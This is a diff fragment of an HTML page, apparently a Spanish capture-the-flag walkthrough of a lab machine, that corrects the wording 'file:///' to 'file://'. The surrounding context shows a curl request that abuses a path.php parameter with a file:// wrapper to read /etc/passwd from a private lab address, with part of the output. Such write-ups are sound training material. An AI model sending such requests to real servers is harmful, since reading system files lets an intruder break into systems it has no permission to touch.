@@ -243,7 +243,7 @@ stroke-linejoin="round" class="feather feather-home">
 <p><img src="/../machines/nyx/wrapp/advanced-search-l-65000.webp" alt="advanced-search-l-65000.png"></p>
 <p>Puedo observar una página web por defecto de tomcat. Al final de la página pone: Users are defined in <strong>/etc/tomcat9/tomcat-users.xml</strong>.</p>
 <p><img src="/../machines/nyx/wrapp/advanced-search-65000.webp" alt="advanced-search-65000.png"></p>
-<p>Después de quedarme atascado en esta parte y gracias a una pista del sr <strong>d4t4s3c</strong> encuentro el wrapper <strong>file:///</strong>  que uso para ver el fichero en  <strong>/etc/passwd</strong>.</p>
+<p>Después de quedarme atascado en esta parte y gracias a una pista del sr <strong>d4t4s3c</strong> encuentro el wrapper <strong>file://</strong>  que uso para ver el fichero en  <strong>/etc/passwd</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -s &#34;http://192.168.1.150/advanced-search/path.php?path=file%3A%2F%2F%2Fetc%2Fpasswd&#34;
 </span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
 </span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
